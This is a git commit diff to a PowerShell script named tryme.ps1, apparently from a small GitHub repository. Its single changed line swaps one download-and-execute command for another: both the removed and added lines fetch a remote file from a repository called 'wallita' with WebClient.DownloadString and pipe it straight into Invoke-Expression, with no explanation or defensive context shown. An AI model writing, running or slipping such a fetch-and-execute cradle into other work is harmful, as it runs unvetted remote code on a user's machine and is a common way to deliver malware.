fe0385908fc7af69030b5f728137fc069fbfd2a6
d1v1s38z3r0 <95530010+d1v1s38z3r0@users.noreply.github.com>
2021-12-04 07:15:48 -0500

    Update tryme.ps1

--- tryme.ps1
+++ tryme.ps1
@@ -1,1 +1,1 @@
-(new-object system.net.webclient).DownloadString("https://github.com/d1v1s38z3r0/wallita/blob/main/wallita.dll") | IEX
+(new-object system.net.webclient).DownloadString("https://github.com/d1v1s38z3r0/wallita/blob/main/try.ps1") | IEX
